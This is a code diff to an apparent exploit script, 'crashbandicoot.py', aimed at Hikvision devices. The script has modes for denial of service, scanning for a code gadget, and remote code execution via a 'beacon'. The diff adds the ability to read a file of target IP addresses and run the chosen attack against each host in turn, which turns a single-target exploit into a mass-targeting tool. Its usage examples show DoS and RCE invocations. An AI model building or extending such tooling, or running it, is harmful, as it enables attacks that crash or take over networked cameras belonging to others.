@@ -747,16 +747,20 @@ Modes:
   rce             Execute LOOP beacon via BX R0 gadget (needs --gadget)
 
 Examples:
-  python3 crashbandicoot.py -t █████████████ --mode check
-  python3 crashbandicoot.py -t █████████████ --mode all-dos
-  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0 --step 0x1001
-  python3 crashbandicoot.py -t █████████████ --mode scan-bxr0 --step 0x401 --start-idx 500
-  python3 crashbandicoot.py -t █████████████ --mode rce --gadget 0x401234AB
+  python3 crashbandicoot.py -t 192.168.1.100 --mode check
+  python3 crashbandicoot.py -t 192.168.1.100 --mode all-dos
+  python3 crashbandicoot.py -t 192.168.1.100 --mode scan-bxr0 --step 0x1001
+  python3 crashbandicoot.py -t 192.168.1.100 --mode scan-bxr0 --step 0x401 --start-idx 500
+  python3 crashbandicoot.py -t 192.168.1.100 --mode rce --gadget 0x401234AB
+
+  # Target list from file (one IP per line, # lines are comments):
+  python3 crashbandicoot.py -t targets.txt --mode check
+  python3 crashbandicoot.py -t targets.txt --mode dos-ua
         """
     )
     p.add_argument('-t', '--target',
                    required=True,
-                   help='Target IP address of the Hikvision device')
+                   help='Target IP address, or path to a .txt file with one IP per line')
     p.add_argument('-m', '--mode',
                    required=True, choices=MODES.keys(),
                    help='Exploit mode (see below)')
@@ -778,15 +782,44 @@ Examples:
 
     args = p.parse_args()
 
-    print(f"  Target : {args.target}  (RTSP:{args.rtsp_port}  HTTP:{args.http_port})")
+    # ── Resolve target list ───────────────────────────────────────────────────
+    import os
+    raw = args.target
+    if os.path.isfile(raw):
+        with open(raw, 'r') as _f:
+            targets = [ln.strip() for ln in _f if ln.strip() and not ln.startswith('#')]
+        if not targets:
+            print(f"[!] Target file '{raw}' is empty or has no valid entries.")
+            sys.exit(1)
+        print(f"  Target list : {raw}  ({len(targets)} hosts)")
+    else:
+        targets = [raw]
+        print(f"  Target : {raw}  (RTSP:{args.rtsp_port}  HTTP:{args.http_port})")
+
     print(f"  Mode   : {args.mode}")
     if args.gadget:
         print(f"  Gadget : {args.gadget}")
     if args.mode == 'scan-bxr0':
         print(f"  Step   : {args.step}  |  Start-idx: {args.start_idx}")
+        if len(targets) > 1:
+            print(f"  [!] scan-bxr0 with a target list — start-idx resets per host")
     print()
 
-    MODES[args.mode](args)
+    for idx, host in enumerate(targets):
+        if len(targets) > 1:
+            print(f"\n{'─'*60}")
+            print(f"  [{idx+1}/{len(targets)}]  {host}")
+            print(f"{'─'*60}")
+        args.target = host
+        try:
+            MODES[args.mode](args)
+        except KeyboardInterrupt:
+            print(f"\n[!] Interrupted at {host}")
+            break
+        except Exception as exc:
+            print(f"[!] {host} — {exc}")
+            continue
+
     print("\n[done]\n")
 
 
